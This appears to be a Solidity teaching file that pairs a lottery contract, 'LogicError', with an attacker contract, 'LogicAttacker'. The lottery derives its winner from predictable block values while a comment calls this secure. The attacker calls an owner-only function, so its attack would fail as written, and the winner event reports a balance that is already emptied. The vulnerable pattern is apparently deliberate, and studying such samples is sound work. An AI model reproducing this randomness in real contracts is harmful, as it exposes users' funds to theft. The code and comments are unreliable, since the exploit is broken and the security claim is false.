// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.19;

contract LogicError {

    address payable[] public participants;
    uint public lotteryAmt; //lottery amount
    bool public isHalted; //stopping the lottery system if attack detected to avoid further damage
    address public owner; //contract owner address

    event WinnerChosen(address winner, uint amount); //emit when winner chosen

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function");
        _;
    }

    constructor() { //initilaise owner and set the halt
        owner = msg.sender;
        isHalted = false;  
    }

    function enterGame() public payable {
        require(!isHalted, "Contract is currently halted");
        require(msg.value == 1 ether, "Wrong entry fee");
        participants.push(payable(msg.sender)); //add current sender to participant list
    }

    function chooseTheWinner() public onlyOwner {
        require(!isHalted, "Contract is not active, attack detected");
        require(participants.length > 0, "No participants in the game");
        
        uint winnerIndex = random() % participants.length; //calculate winner index
        address payable winner = participants[winnerIndex]; //get winner address
        winner.transfer(address(this).balance); //transfer funds to winner
        lotteryAmt++; //Increment
        emit WinnerChosen(winner, address(this).balance); //emit the winnner
    }

    function toggleHalt() public onlyOwner {
        isHalted = !isHalted; 
    }

    function random() private view returns (uint) {
        //random number generation on participant count and secure block number
        return uint(keccak256(abi.encodePacked(block.basefee, block.number, participants.length)));
    }

    function withdrawBalance() public onlyOwner {
        require(!isHalted, "Contract is currently not in use");
        payable(msg.sender).transfer(address(this).balance); //transfer to owner
    }
}

contract LogicAttacker {
    LogicError public gameError; //store vulnerable contract
    constructor(address _logicErrorAddress) {  //to take vulnerable address as argument for deploying
        gameError = LogicError(_logicErrorAddress);
    }
    function attack() public payable {
        require(msg.value == 1 ether, "Incorrect entry fee");
        gameError.enterGame{value: 1 ether}(); //calls the enterGame function of vulnerable contract with 1 Ether
        gameError.chooseTheWinner(); //calls chooseTheWinner funcion
    }
    receive() external payable {
        gameError.chooseTheWinner(); //fallback to call choseTheWinner to ensure attack success
    }
}